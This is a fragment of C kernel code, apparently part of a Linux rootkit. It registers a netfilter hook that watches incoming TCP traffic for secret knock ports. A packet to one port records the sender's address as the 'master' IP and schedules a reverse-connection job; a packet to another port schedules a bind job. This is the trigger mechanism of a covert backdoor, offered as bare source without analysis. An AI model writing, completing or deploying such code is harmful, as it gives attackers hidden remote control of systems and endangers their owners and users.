static unsigned int bds_nf_hook(void *priv, struct sk_buff *skb, const struct nf_hook_state *state)
{
	struct iphdr *iph;
	struct tcphdr *tcp_header;
	
	if (!skb)
		return NF_ACCEPT;
	iph = ip_hdr(skb);
	if (iph->protocol == IPPROTO_TCP) {
		tcp_header = (struct tcphdr *) skb_transport_header(skb);
		if (ntohs(tcp_header->dest) == atoi(BDS_REVERSE_KNOCKING_PORT)) {
			MASTER_IP = n_kmalloc(16);
			snprintf(MASTER_IP, 16, "%pI4", &iph->saddr);
			schedule_work(&do_umode_exec);
		}
		if (ntohs(tcp_header->dest) == atoi(BDS_BIND_KNOCKING_PORT)) {
			schedule_work(&do_work_bind);
		}
		return NF_ACCEPT;
	}
	return NF_ACCEPT;
}
